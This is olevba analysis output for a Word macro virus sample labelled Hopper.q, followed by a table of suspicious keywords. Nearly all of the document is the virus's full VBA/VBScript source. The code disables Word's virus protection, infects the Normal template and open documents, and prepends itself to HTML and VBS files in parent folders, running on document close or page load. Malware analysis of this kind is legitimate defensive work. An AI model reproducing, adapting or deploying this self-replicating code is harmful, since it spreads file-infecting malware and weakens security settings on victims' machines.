olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hopper.q-a0ff67146c1b6f567bc25e79e959ea17bb1dd73c
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSOffice.Hopper.q-a0ff67146c1b6f567bc25e79e959ea17bb1dd73c 
in file: Virus.MSOffice.Hopper.q-a0ff67146c1b6f567bc25e79e959ea17bb1dd73c - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<html><!--kiss-->
'<BODY>
'<script language="VBScript"><!--
Private Fso, NT, InfType, HostPath, Target, NextLine, TempFile
'Private Sub WscriptCode
   On Error Resume Next
   HostType = 3
   HostPath = Wscript.ScriptFullName
   Call GotoWord
   Call FindHTMVBS
'End Sub
Private Sub Window_Onload
   Dim FSO, CurrentPath, folder, fc, f1
   If location.protocol = "file:" then
      Set FSO = CreateObject("Scripting.FileSystemObject")
      HostPath = Replace(location.href, "file:///", "")
      HostPath = Replace(HostPath, "/", "\")
      HostType = 2
      Call GotoWord
      Call FindHTMVBS
   End If
End Sub

Private Sub GotoWord
   Set WordObj = CreateObject("Word.Application")
   Set NT = WordObj.Templates(1).VBProject.VBComponents(1).Codemodule
   If NT.Lines(1,1) <> "'<html><!--kiss-->" then
      WordObj.Options.SaveNormalPrompt = False
      NT.DeleteLines 1, NT.CountOfLines
      NT.Addfromfile HostPath
      NT.DeleteLines 156, (NT.CountOfLines - 155)
      if HostType = 2 then
         For j = 1 to 3
            NT.ReplaceLine j, "'" + NT.Lines(j,1)
         Next
         For j = 153 to 155
            NT.ReplaceLine j, "'" + NT.Lines(j,1)
            Next
      Else
         NT.ReplaceLine  7, Mid(NT.Lines( 7,1),2)
         NT.ReplaceLine 13, Mid(NT.Lines(13,1),2)
      end if
   End If
   Set NT = Nothing
   WordObj.Quit
End Sub
Private Sub FindHTMVBS
   Set FSO = CreateObject("Scripting.FileSystemObject")
   CurrentPath = fso.GetParentFolderName(HostPath)
   Set folder = fso.GetFolder(cpath)
   While folder.IsRootFolder = false
      Set folder = fso.GetFolder(CurrentPath)
      Set fc = folder.Files
      cpath = fso.GetParentFolderName(CurrentPath)
      For each Target in fc
         InfExt = Lcase(Fso.GetExtensionName(Target.name)) = "html"
         If (InfExt = "html" or InfExt = "htm" or InfExt = "vbs") AND Target.path <> HostName then
            Set fh = fso.opentextfile(Target.path, 1, true)
            TestString = fh.readline
            fh.close
            If TestString <> "<html><!--kiss-->" AND TestString <> "'<html><!--kiss-->" then
               TempFile = fso.GetTempName
               fso.CopyFile Target.path, TempFile
               Set ft = fso.opentextfile(Target.path, 2, true)
               If HostType = 1 then
                  For j = 1 to 155
                      NextLine = NT.Lines (j, 1)
                      Call CheckLine (j)
                      ft.Writeline NextLine
                  Next
               Else
                  Set fh = fso.opentextfile(HostPath, 1, true)
                  For j = 1 to 155
                      NextLine = fh.ReadLine
                      Call CheckLine (j)
                      ft.Writeline NextLine
                  Next
                  fh.close
               End If
               ft.close
               Set fh = fso.opentextfile(TempFile, 1, true)
               Set ft = fso.opentextfile(Target.path, 8, true)
               Do While fh.AtEndOfStream <> True
                  ft.WriteLine fh.ReadLine
               Loop
               ft.close
               fh.close
               fso.DeleteFile TempFile
            End IF
         End If
      Next
   Wend
End Sub
Private Sub CheckLine (LineNumber)
   If HostType = 1 then
      If InfType = "htm" then
         If LineNumber < 4 or LineNumber > 152 then
            NextLine = Mid(NextLine,2)
         End If
      Else
         If LineNumber = 7 or LineNumber = 13 then
            NextLine = "'" + NextLine
         End If
      End If
   Elseif HostType = 2 then
      If InfType = "vbs" then
         If LineNumber < 4 or LineNumber > 152 then
            NextLine = "'" + NextLine
         End If
         If LineNumber = 7 or LineNumber = 13 then
            NextLine = "'" + NextLine
         End If
      End If
   Else
      If InfType = "htm" then
         If LineNumber < 4 or LineNumber > 152 then
            NextLine = Mid(NextLine,2)
         End If
         If LineNumber = 7 or LineNumber = 13 then
            NextLine = Mid(NextLine,2)
         End If
      End If
   End If
End Sub

Private Sub Document_Close()
   On Error Resume Next
   Set NT = NormalTemplate.VBProject.VBComponents(1).CodeModule
   Set AD = ActiveDocument.VBProject.VBComponents(1).CodeModule
   Options.VirusProtection = False
   Options.ConfirmConversions = False
   Options.SaveNormalPrompt = False
   If NT.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         NT.InsertLines i, AD.Lines(i, 1)
      Next
   End If
   If AD.Lines(1, 1) <> "'<html><!--kiss-->" Then
      For i = 1 To 155
         AD.InsertLines i, NT.Lines(i, 1)
      Next
   End If
   HostType = 1
   HostPath = "C:\Windows\Web\Afile.htm"
   Call FindHTMVBS
End Sub

'--></script>
'</BODY>
'</HTML>
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

